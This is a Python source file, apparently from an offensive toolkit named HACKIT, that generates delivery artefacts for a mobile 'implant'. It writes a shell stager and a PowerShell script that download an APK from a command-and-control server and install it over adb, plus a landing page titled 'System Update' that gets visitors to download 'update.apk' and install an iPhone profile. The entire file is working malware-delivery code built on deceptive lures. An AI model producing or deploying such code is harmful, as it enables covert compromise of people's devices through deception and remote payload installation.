"""Cross-network delivery: one link that installs the implant on any device.

Three artefacts share one C2 URL:

* ``stager.sh``    — curl/wget the APK, install through adb or a file manager.
* ``install.ps1``  — Windows PowerShell variant with a progress-free download.
* ``index.html``   — landing page: auto-download, iOS profile link, instructions.

The APK itself is served by the C2 at ``/dl/<token>/agent.apk``; the token is
the same one the web agent uses, so nothing is guessable from the URL alone.
"""
from __future__ import annotations

import json
import os
from typing import Dict, List

STAGER_SH = """#!/usr/bin/env sh
# HACKIT installer — {host}
set -e
TOKEN='{token}'
BASE='{host}'
OUT="${{TMPDIR:-/tmp}}/agent.apk"
echo "[*] fetching payload"
if command -v curl >/dev/null 2>&1; then
  curl -fsSL "$BASE/dl/$TOKEN/agent.apk" -o "$OUT"
else
  wget -q "$BASE/dl/$TOKEN/agent.apk" -O "$OUT"
fi
SIZE=$(wc -c < "$OUT" 2>/dev/null || echo 0)
echo "[*] payload $SIZE bytes"
if command -v adb >/dev/null 2>&1; then
  echo "[*] installing over adb"
  adb install -r "$OUT"
else
  echo "[!] adb not found — copy $OUT to the phone and tap it"
  echo "    Android: Settings > Apps > Special access > Install unknown apps"
fi
"""

INSTALL_PS1 = """# HACKIT installer — {host}
$ErrorActionPreference = 'Stop'
$Token = '{token}'
$Base  = '{host}'
$Out   = Join-Path $env:TEMP 'agent.apk'
Write-Host '[*] fetching payload'
Invoke-WebRequest -Uri "$Base/dl/$Token/agent.apk" -OutFile $Out
Write-Host "[*] payload $((Get-Item $Out).Length) bytes -> $Out"
if (Get-Command adb -ErrorAction SilentlyContinue) {{
  adb install -r $Out
}} else {{
  Write-Host '[!] adb not found — copy the apk to the phone and tap it'
}}
"""

LANDING = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>System Update</title>
<style>
body{{margin:0;background:#0b0f14;color:#d7e3ee;font:15px/1.55 -apple-system,system-ui,sans-serif;
padding:32px 20px env(safe-area-inset-bottom)}}
.card{{max-width:520px;margin:0 auto;background:#131a22;border:1px solid #22303d;border-radius:16px;padding:22px}}
h1{{font-size:18px;margin:0 0 4px}}
p{{color:#8fa3b6;font-size:13.5px;margin:8px 0}}
a,button{{display:block;width:100%;text-align:center;background:#0e141b;color:#33d1a0;
border:1px solid #22303d;border-radius:12px;padding:14px;margin:10px 0;text-decoration:none;font:inherit}}
small{{color:#6f8397}}
</style></head><body><div class="card">
<h1>System Update</h1>
<p>A required update is ready for this device.</p>
<a href="/dl/{token}/agent.apk" download="update.apk">Download update</a>
<a href="/w/{token}/">Open web agent</a>
<a href="/w/{token}/hackit-webclip.mobileconfig">Install iPhone profile</a>
<p><small>Android: allow installs from this browser, then tap the download.
iPhone: install the profile, then open the new Home Screen icon once.</small></p>
</div></body></html>
"""


def build(host: str, config: Dict[str, object], directory: str, token: str = "") -> List[str]:
    os.makedirs(directory, exist_ok=True)
    token = token or _token()
    base = host.rstrip("/")
    made: List[str] = []

    sh = os.path.join(directory, "stager.sh")
    with open(sh, "w", encoding="utf-8") as handle:
        handle.write(STAGER_SH.format(host=base, token=token))
    os.chmod(sh, 0o755)
    made.append(sh)

    ps1 = os.path.join(directory, "install.ps1")
    with open(ps1, "w", encoding="utf-8") as handle:
        handle.write(INSTALL_PS1.format(host=base, token=token))
    made.append(ps1)

    html = os.path.join(directory, "index.html")
    with open(html, "w", encoding="utf-8") as handle:
        handle.write(LANDING.format(host=base, token=token))
    made.append(html)

    profile = os.path.join(directory, "hackit-webclip.mobileconfig")
    from . import ios

    with open(profile, "wb") as handle:
        handle.write(ios.profile("System Update", base + "/w/" + token + "/"))
    made.append(profile)

    manifest = os.path.join(directory, "delivery.json")
    with open(manifest, "w", encoding="utf-8") as handle:
        json.dump(
            {
                "host": base,
                "token": token,
                "apk_url": f"{base}/dl/{token}/agent.apk",
                "web_url": f"{base}/w/{token}/",
                "profile_url": f"{base}/w/{token}/hackit-webclip.mobileconfig",
                "native_udp_port": int(config.get("native_port") or 0),
            },
            handle,
            indent=2,
        )
    made.append(manifest)
    return made


def _token() -> str:
    from . import store

    path = os.path.join(store.ROOT, "webtoken")
    if os.path.exists(path):
        return open(path, encoding="utf-8").read().strip()
    token = os.urandom(9).hex()
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(token)
    return token